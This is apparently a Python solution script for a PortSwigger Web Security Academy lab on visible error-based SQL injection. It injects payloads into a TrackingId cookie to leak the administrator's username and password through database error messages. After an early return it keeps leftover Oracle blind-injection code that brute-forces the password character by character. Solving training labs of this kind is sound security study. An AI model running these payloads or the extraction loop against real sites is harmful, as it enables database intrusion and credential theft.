# SQL injection 38 of 51
# Lab: Visible error-based SQL injection

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST = """
GET /filter?category=Lifestyle HTTP/2
Host: 0abb00aa043ea95f85b89c81008a00cf.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: https://0abb00aa043ea95f85b89c81008a00cf.web-security-academy.net/filter?category=Lifestyle
Cookie: session=1BfhHojFi7gzFfRSC6hAoEYD50elZSOs; TrackingId=Y4fz23Gnwu3JOhlS@@@PAYLOAD@@@
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
TE: trailers
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_error_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        print(f" CALL OK")
        return True
    else:
        print(" CALL FAILED")
        if print_error_body:
            pprint(result)
        return False

async def main():

    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_0)

    # Printing response body, you can see the following error:
    # Unterminated string literal started at 
    #   position 52 in SQL SELECT * FROM tracking WHERE id = 
    #   "'Y4fz23Gnwu3JOhlS''. Expected  char
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'")
    print('WITH ERROR CALL:', end='')
    await print_net_result(raw_req_3, False)

    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'--")
    print('WITHOUT ERROR CALL:', end='')
    await print_net_result(raw_req_5, False)

    # Printing response body, you can see the following error:
    # ERROR: argument of AND must be type boolean, not type integer
    raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "' AND CAST((SELECT 1) AS int)--")
    print('WITH "AND" ERROR CALL:', end='')
    await print_net_result(raw_req_7, False)

    raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "' AND 1=CAST((SELECT 1) AS int)--")
    print('WITH "AND" SUCCESSFUL CALL:', end='')
    await print_net_result(raw_req_9, False)

    # Now, we have all the "tools" we need
    raw_req_11 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "' AND 1=CAST((SELECT username FROM users) AS int)--")
    print('TOO LONG CONDITION:', end='')
    await print_net_result(raw_req_11, False)

    if "Y4fz23Gnwu3JOhlS" in RAW_REQUEST: RAW_REQUEST_1 = RAW_REQUEST.replace("Y4fz23Gnwu3JOhlS", "")
    else: raise Exception("Update your TrackingID here!")

    # ERROR: more than one row returned by a subquery used as an expression
    raw_req_13 = RAW_REQUEST_1.replace("@@@PAYLOAD@@@", "' AND 1=CAST((SELECT username FROM users) AS int)--")
    print('NOT TOO LONG CONDITION:', end='')
    await print_net_result(raw_req_13, False)

    # ERROR: invalid input syntax for type integer: "administrator"
    raw_req_15 = RAW_REQUEST_1.replace("@@@PAYLOAD@@@", "' AND 1=CAST((SELECT username FROM users limit 1) AS int)--")
    print('FINAL ATTACK - USER:', end='')
    await print_net_result(raw_req_15, False)

    # ERROR: invalid input syntax for type integer: "9xyo3dfqf53lnei71unt"
    raw_req_17 = RAW_REQUEST_1.replace("@@@PAYLOAD@@@", "' AND 1=CAST((SELECT password FROM users limit 1) AS int)--")
    print('FINAL ATTACK - PASSWORD:', end='')
    await print_net_result(raw_req_17, True)

    return

    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "''")
    print('WITHOUT ERROR (but with db check) CALL:', end='')
    await print_net_result(raw_req_5)

    raw_req_4a = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '')||'""")
    print('WITHOUT ERROR (if sql) CALL:', end='')
    await print_net_result(raw_req_4a)
    
    raw_req_4b = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' from dual)||'""")
    print('WITHOUT ERROR (if oracle) CALL:', end='')
    await print_net_result(raw_req_4b)

    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' FROM not_a_real_table)||'""")
    print('Oracle fake table:', end='')
    await print_net_result(raw_req_5)

    # WHERE ROWNUM=1 is important because more than one results would break the concatenation!
    raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT '' FROM users WHERE ROWNUM = 1)||'""")
    print('Oracle table "users":', end='')
    await print_net_result(raw_req_6)

    raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""")
    print('Oracle error test:', end='')
    await print_net_result(raw_req_7)

    raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""")
    print('Oracle non-error test:', end='')
    await print_net_result(raw_req_8)

    raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", """'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'""")
    print('Oracle administrator test:', end='')
    await print_net_result(raw_req_9)

    # We could use "greather than" instead of "equals" and use binary search for the length, but I kept it simple!
    pwd_len = None
    for i in range(1, 40):
        payload = """'||(SELECT CASE WHEN LENGTH(password)<>@@@LEN@@@ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'""".replace("@@@LEN@@@", str(i))
        raw_req_10 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
        print(f'Oracle administrator password length {i}:', end='')
        if await print_net_result(raw_req_10):
            pwd_len = i
            break

    import string
    pwd = ''
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
    for i in range(1, pwd_len+1):
        for c in charset:
            payload = f"""'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"""
            raw_req_14 = RAW_REQUEST.replace("@@@PAYLOAD@@@", payload)
            print(f'Oracle administrator password {c} in position {i+1}:', end='')
            if await print_net_result(raw_req_14):
                pwd += c
                print(f'Password so far: {pwd}')
                break
    

if __name__ == "__main__":
    asyncio.run(main())